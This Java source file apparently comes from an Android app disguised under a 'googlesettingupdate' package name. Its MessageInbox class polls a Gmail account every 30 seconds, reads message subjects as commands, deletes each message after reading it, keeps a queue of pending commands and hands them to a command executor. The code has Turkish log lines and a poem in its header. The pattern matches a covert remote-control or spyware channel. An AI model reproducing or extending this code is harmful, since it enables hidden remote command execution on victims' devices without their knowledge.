package com.setting.dl.google.googlesettingupdate.ptt.box;


/* * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Erteliyorum hasretini.                              *
 * Aptallığım, düşünmemek için seni.                   *
 * Hiçbirşey olmamış,                                  *
 * Hiçbirşey yaşanmamış gibi davranmaya çalışıyorum.   *
 * Kalbim kırık,                                       *
 * Ama alışıyorum...                                   *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * */

import android.content.Context;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.annimon.stream.Stream;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.ptt.command.CommandExecutor;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.concurrent.WorkerThread1;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IErrorListener;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IWorkerHandler;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IWorkerProccessor;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.ptt.dispatch.Dispatch;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.FilesCheckers;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommand;
import com.setting.dl.google.googlesettingupdate.ptt.dispatch.IDispatch;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommandExecutor;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.u;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedDeque;

public class MessageInbox implements
      IInbox,
      IErrorListener,
      IWorkerProccessor<List<Message>, ConcurrentLinkedDeque<ICommand>>,
      IWorkerHandler<ConcurrentLinkedDeque<ICommand>> {
   
   private static final String                          KEY_COMMAND_MESSAGES       = "CommandMessages";
   //private static final String                          KEY_LAST_CHECK_UP_INTERVAL = "LAST_CHECK_UP_INTERVAL_LIMIT";
   private static final String                          PREF_MESSAGE_INBOX         = "MessageInbox";
   private final        List<String>                    inboxLabels;
   private              Gmail                           gmail;
   private              String                          queryFrom;
   private              ConcurrentLinkedDeque<ICommand> commandMessages;
   private              Save                            save;
   private              IDispatch                       dispatch;
   private              long                            lastCheck;
   
   MessageInbox(Context context, Gmail gmail, List<String> labels, String query) {
      
      this.gmail = gmail;
      inboxLabels = labels;
      queryFrom = query;
      save = new Save(context, PREF_MESSAGE_INBOX);
      commandMessages = new ConcurrentLinkedDeque<>(save.getObjectsList(KEY_COMMAND_MESSAGES, com.setting.dl.google.googlesettingupdate.ptt.message.Message.class));
      
      dispatch = new Dispatch();
      ICommandExecutor reciever = new CommandExecutor(context);
      dispatch.registerReciever(reciever);
   }
   
   private void addCommand(ICommand commandMessage) {
      
      commandMessages.addLast(commandMessage);
      
      u.log.d("Yeni bir konu eklendi : %s", commandMessage.getCommandId());
   }
   
   synchronized
   private void saveCommands() {
      
      if (commandMessages.size() > 20) {
         
         List<ICommand> temp = Stream.of(commandMessages).filter(c -> !c.isExecuted() && c.getCommand() != null).toList();
         
         commandMessages.clear();
         commandMessages.addAll(temp);
         
         u.log.d("Konular 20 adet oldu. Sağ baştan sil etkin \u2603");
         
         if (commandMessages.size() > 20) {
            
            commandMessages.removeLast();
         }
      }
      
      save.deleteValue(KEY_COMMAND_MESSAGES);
      save.saveObjectsList(KEY_COMMAND_MESSAGES, new ArrayList<>(commandMessages));
      u.log.d("Konular kaydedildi.");
      
      int size = commandMessages.size();
      u.log.d("%d konu var", size);
      
      /*int i = 1;
      
      for (ICommand commandMessage : commandMessages) {
         
         String val = u.format(
      
               "%n%n" +
               "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF%n" +
               "commandId : %s%n" +
               "subject   : %s%n" +
               "sDate     : %s%n" +
               "rDate     : %s%n" +
               "exDate    : %s%n" +
               "exiDate   : %s%n" +
               "deleted   : %s%n" +
               "executed  : %s%n" +
               "executing : %s%n" +
               "tryCount  : %d%n" +
               "comments  : %s%n" +
               "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF",
      
            
               commandMessage.getCommandId(),
               commandMessage.getCommand(),
               commandMessage.getSendDate() != 0 ? Time.getDate(commandMessage.getSendDate()) : "-",
               commandMessage.getRecieveDate() != 0 ? Time.getDate(commandMessage.getRecieveDate()) : "-",
               commandMessage.getExecuteDate() != 0 ? Time.getDate(commandMessage.getExecuteDate()) : "-",
               commandMessage.getExecutingDate() != 0 ? Time.getDate(commandMessage.getExecutingDate()) : "-",
               commandMessage.isDeleted(),
               commandMessage.isExecuted(),
               commandMessage.isExecuting(),
               commandMessage.getTryCount(),
               commandMessage.getComments() != null ? commandMessage.getComments() : "-"
         );
         
         
         u.log.d("%d. Konu", i++);
         u.log.d(val);
         
      }*/
      
      if (size == 0) return;
      
      
      long deletedMessages    = Stream.of(commandMessages).filter(ICommand::isDeleted).count();
      int  notDeletedMessages = size - (int) deletedMessages;
      
      if (deletedMessages == size) {
         
         u.log.d("Alınan konular arasında silinmeyen bir konu yok");
      }
      else {
         
         u.log.d("Alınan konulardan %d tanesi silinmiş %d tanesi silinmemiş durumda", deletedMessages, notDeletedMessages);
      }
      
   }
   
   @NonNull
   private List<Message> getInboxMessages(Gmail gmail, List<String> labels, String query) {
      
      List<Message> inbox = new ArrayList<>();
      
      List<Message> messageList = Mail.mylistMessagesWithLabelsWithQ(gmail, labels, query);
      
      if (messageList == null) return inbox;
      
      if (messageList.size() == 0) return inbox;
      
      for (Message message : messageList) {
         
         Message inboxMessage = Mail.getMessage(gmail, message.getId());
         
         if (inboxMessage == null) continue;
         
         inbox.add(inboxMessage);
      }
      
      return inbox;
   }
   
   private boolean deleteMessage(Gmail gmail, String messageId) {
      
      boolean b = Mail.delete(gmail, messageId);
      
      if (b) {
         
         u.log.d("Mesaj silindi : %s", messageId);
         onMessageDelete(messageId);
      }
      else {
         
         u.log.d("Mesaj silinemedi : %s", messageId);
      }
      
      return b;
   }
   
   private void onMessageDelete(String id) {
      
      for (ICommand commandMessage : commandMessages) {
         
         if (commandMessage.getCommandId() != null && commandMessage.getCommandId().equals(id)) {
            
            commandMessage.setDeleted();
            u.log.d("Konu kaynağı silindi : %s", id);
            saveCommands();
            return;
         }
      }
      
      u.log.d("Kaynakta böyle bir konu yok : %s", id);
   }
   
   @NotNull
   private List<Message> deleteMessages(Gmail gmail, List<Message> messages) {
      
      List<Message> deletedMessages = new ArrayList<>();
      
      for (Message message : messages) {
         
         if (Mail.delete(gmail, message.getId())) {
            
            deletedMessages.add(message);
         }
      }
      
      return deletedMessages;
   }
   
   @NotNull
   private List<Message> deleteAllMessages(Gmail gmail, List<String> labels, String query) {
      return deleteMessages(gmail, getInboxMessages(gmail, labels, query));
   }
   
   @Override
   synchronized
   public void checkInbox() {
      
      if (!FilesCheckers.timeIsUP(lastCheck, 30000L)) return;
      
      lastCheck = System.currentTimeMillis();
      
      u.log.d("Yeni konu var mı kontrol ediliyor : %s", Time.getDate(System.currentTimeMillis()));
      
      new WorkerThread1<List<Message>, ConcurrentLinkedDeque<ICommand>>()
            .thisIsMyWork(() -> this.getInboxMessages(gmail, inboxLabels, queryFrom))
            .handleOnForeground(this)
            .proccessOnBackground(this)
            .onWorkError(this)
            .start();
   }
   
   @Override
   public void onWorkError(Exception e) {
      
      u.log.d(e.getMessage());
   }
   
   @Override
   public ConcurrentLinkedDeque<ICommand> onWorkProccess(List<Message> result) {
      
      if (commandMessages.size() == 0) {
         
         u.log.d("Kayıtlı eski bir konu yok \u270B");
      }
      else {
         
         u.log.d("%d Kayıtlı eski konu var. Tekrar kontrol edilecek \u270A", commandMessages.size());
         
         long count = Stream.of(commandMessages).filter(c -> !c.isExecuted()).count();
         
         if (count == 0) {
            
            u.log.d("Eski konulardan işlenmeyen bir konu yok \u270C");
         }
         else {
            
            u.log.d("Eski konulardan işlenmeyen %d konu var. Tekrar işleme alınacak", count);
         }
      }
      
      if (result.size() == 0) {
         
         u.log.d("Yeni konu yok");
         return commandMessages;
      }
      
      u.log.d("%d yeni konu alındı.", result.size());
      
      for (Message message : result) {
         
         String command = Mail.getSubject(message);
         
         if (command.equals("konu-alınamıyor")) {
            
            deleteMessage(gmail, message.getId());
            u.log.d(command);
            continue;
         }
         
         ICommand commandMessage = new com.setting.dl.google.googlesettingupdate.ptt.message.Message(message);
         ICommand existMessage   = exist(commandMessage);
         
         if (existMessage != null) {
            
            u.log.d("Konu zaten var : %s", message.getId());
            u.log.d(commandMessage.getCommandId());
            u.log.d(existMessage.getCommandId());
            
            deleteMessage(gmail, message.getId());
            continue;
         }
         
         if (deleteMessage(gmail, message.getId())) {
            
            commandMessage.setDeleted();
         }
         
         addCommand(commandMessage);
      }
      
      saveCommands();
      return commandMessages;
   }
   
   @Nullable
   private ICommand exist(ICommand message) {
      
      if(message.getCommandId() == null) return null;
      
      for (ICommand message1 : commandMessages) {
         
         if (message1.getCommandId() != null && message1.getCommandId().equals(message.getCommandId())) return message1;
      }
      
      return null;
   }
   
   @Override
   public void onWorkResult(ConcurrentLinkedDeque<ICommand> result) {
      
      List<ICommand> messages = new ArrayList<>();
   
      for (ICommand command : commandMessages) {
   
         if (!command.isExecuted()) {
            
            messages.add(command);
         }
      }
      
      if (messages.size() == 0) return;
      
      u.log.d("Konular dağıtılıyor \u2600");
      
      try {
         
         dispatch.publishMessages(messages);
      }
      catch (CommandExecutor.OrderException e) {
         u.log.w(e.getMessage());
         e.printStackTrace();
      }
      catch (CommandExecutor.InvalidOrderArgumentException e) {
         
         u.log.w(e.getMessage());
         e.printStackTrace();
      }
      finally {
         stopAllExecutingCommands();
      }
   }
   
   private void stopAllExecutingCommands(){
   
      for (ICommand command : commandMessages) {
         
         command.setExecuting(false);
      }
      
      saveCommands();
   }
   
   @Override
   public void onMessageSent(IMessage message) {
      
      for (ICommand commandMessage : commandMessages) {
         
         if (commandMessage.getCommandId() == null) continue;
   
         ICommand command = (ICommand) message;
         
         if(command == null || command.getCommandId() == null) continue;
   
         if (commandMessage.getCommandId().equals(command.getCommandId())) {
            
            commandMessage.setExecuted();
            u.log.d("Konu işlendi : %s", message.getId());
            saveCommands();
            return;
         }
      }
   }
   
   @Override
   public void onCheckComplete(@Nullable String commandId) {
      
      setCommandExecuted(commandId, null);
   }
   
   @Override
   public void setCommandExecuted(String id, String comment) {
      
      if (id == null) return;
      
      for (ICommand commandMessage : commandMessages) {
         
         if (commandMessage.getCommandId().equals(id)) {
            
            if (comment != null) {
               
               commandMessage.addComment(comment);
            }
            
            commandMessage.setExecuted();
            u.log.d("Konu işlendi : %s", id);
            saveCommands();
            return;
         }
      }
      
      u.log.d("Bu konu listede yok : %s", id);
   }
   
   @Override
   public void setCommandExecuting(boolean isExecuting, String id, String comment) {
      
      for (ICommand commandMessage : commandMessages) {
         
         if (commandMessage.getCommandId() != null && commandMessage.getCommandId().equals(id)) {
            
            commandMessage.setExecuting(isExecuting);
            
            if (comment != null) {
               
               commandMessage.addComment(comment);
            }
   
            if (isExecuting) {
   
               u.log.d("Konu işleme alındı : %s", id);
            }
            else{
   
               u.log.d("Konunun işlenmesi durduruldu : %s", id);
            }
            
            
            saveCommands();
            return;
         }
      }
   }
   
   
   @Override
   public void deleteAllCommands() {
      
      commandMessages.clear();
      
      save.deleteValue(KEY_COMMAND_MESSAGES);
   }
   
   @Override
   public ICommand getCommand(String commandId) {
   
      if (commandId == null) {
         
         u.log.w("commandId null");
         return null;
      }
      
      
      for (ICommand command : commandMessages) {
   
         if (commandId.equals(command.getCommandId())) {
            
            return command;
         }
      }
      
      u.log.d("İstenen komut bulunamadı : %s", commandId);
      return null;
   }
}
